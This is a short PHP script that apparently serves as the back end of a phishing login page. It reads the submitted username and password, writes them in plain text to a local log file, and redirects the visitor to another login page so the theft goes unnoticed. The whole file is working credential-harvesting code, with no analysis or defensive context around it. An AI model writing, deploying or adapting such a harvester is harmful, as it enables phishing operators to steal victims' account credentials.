<?php
$file = 'log.txt';
$fp = fopen($file , 'a');
file_put_contents("log.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: ./login3.html');
exit();
?>
